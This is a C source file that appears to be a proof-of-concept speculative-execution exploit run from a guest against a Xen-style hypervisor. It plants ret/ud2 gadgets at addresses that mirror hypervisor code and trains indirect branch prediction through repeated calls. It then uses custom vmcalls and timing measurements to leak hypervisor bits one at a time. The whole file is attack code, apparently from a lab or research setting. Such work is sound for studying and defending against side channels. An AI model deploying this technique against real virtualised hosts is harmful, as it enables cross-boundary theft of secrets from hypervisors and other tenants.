#include <sys/ioctl.h>
#include <err.h>
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* 6 bytes indirect call */
#define CALL_NOP_INDIRECTLY_CALL_ADDR 0xFFFF82D0801CC52E

#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))

unsigned long load_loadme_unused_addrs[] = {
  0xffff82d0801cc370, 0xffff82d0801cc390,
  0xffff82d0801cc3b0, 0xffff82d0801cc3d0,
  0xffff82d0801cc3f0, 0xffff82d0801cc410,
  0xffff82d0801cc430, 0xffff82d0801cc450,
  0xffff82d0801cc470, 0xffff82d0801cc490
};

unsigned long hyper_down(unsigned long hyper_addr) {
  return hyper_addr - (0xffff828000000000 - 0x0000100000000000);
}

void *round_down_to_page(unsigned long addr) {
  return (void*)(addr & ~0xfffUL);
}

unsigned char call_to_rip_relative_memop_code[] = {
  0xFF, 0x15, 0xF2, 0xFF, 0xFF, 0xFF, /* call [rip-0x6-0x8] */
  0xc3, /* ret */
  0x0f, 0x0b /* ud2 */
};

long hyper(unsigned int rax, unsigned long rdi) {
  asm volatile("vmcall" : "+a"(rax) : "D"(rdi) : /*clob*/);
  return rax;
}

int mislead_fn_call(void (*mislead_fn)(void), unsigned long idx) {
  ((unsigned long *)hyper_down(CALL_NOP_INDIRECTLY_CALL_ADDR))[-1] = load_loadme_unused_addrs[idx];
  mislead_fn();
  return 0;
}

int main(void) {
  setbuf(stdout, NULL);

  char *mapping = mmap(round_down_to_page(hyper_down(0xffff82d0801cc370)), 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
  if (mapping != round_down_to_page(hyper_down(0xffff82d0801cc370)))
    errx(1, "mmap hyper");

  for (int i=0; i<ARRSIZE(load_loadme_unused_addrs); i++) {
    load_loadme_unused_addrs[i] = hyper_down(load_loadme_unused_addrs[i]);
  }

  for (int i=0; i<ARRSIZE(load_loadme_unused_addrs); i++) {
    ((unsigned char *)load_loadme_unused_addrs[i])[0] = 0xc3; /* ret */
    ((unsigned char *)load_loadme_unused_addrs[i])[1] = 0x0f; /* ud2 */
    ((unsigned char *)load_loadme_unused_addrs[i])[2] = 0x0b;
  }

  memcpy((void*)hyper_down(CALL_NOP_INDIRECTLY_CALL_ADDR), call_to_rip_relative_memop_code, sizeof(call_to_rip_relative_memop_code));

  void (*mislead_fn)(void) = (void*)hyper_down(CALL_NOP_INDIRECTLY_CALL_ADDR);

  hyper(0x13370000, 0);
  hyper(0x13370000, 1);
  for (int i=0; i<100; i++) {
    printf("fresh flushed: %ld\n", hyper(0x13370000, 0));
  }
  int bit_idx = 0;
  int bit_hits = 0;
  int one_hits = 0;
  for (unsigned int j=0; /*j<*/1000; j++) {
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 0);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 1);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 2);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 4);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 3);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 5);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 8);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 7);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 6);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 9);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 5);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 7);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 4);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 6);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 9);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 8);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 3);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 2);
    for (int i=0; i<300; i++) mislead_fn_call(mislead_fn, 4);
    for (int i=0; i<(j&0x100); i++) mislead_fn_call(mislead_fn, 0);



    hyper(0x13370001, bit_idx);
    hyper(0x13370001, bit_idx);
    hyper(0x13370001, bit_idx);
    hyper(0x13370001, bit_idx);
    hyper(0x13370001, bit_idx);
    long result = hyper(0x13370000, (j & 1));
    if (result < 250) {
      printf("%d", (j & 1));
      if ((j & 1)) one_hits++;
      bit_hits++;
      if (bit_hits == 100) {
        printf("\nbit %d: %d (%d%% one)\n", bit_idx, (one_hits>=50), one_hits);
        bit_idx++;
        bit_hits = 0;
        one_hits = 0;
        if (bit_idx == 16) {
          exit(0);
        }
      }
    }
  }

  return 0;
}
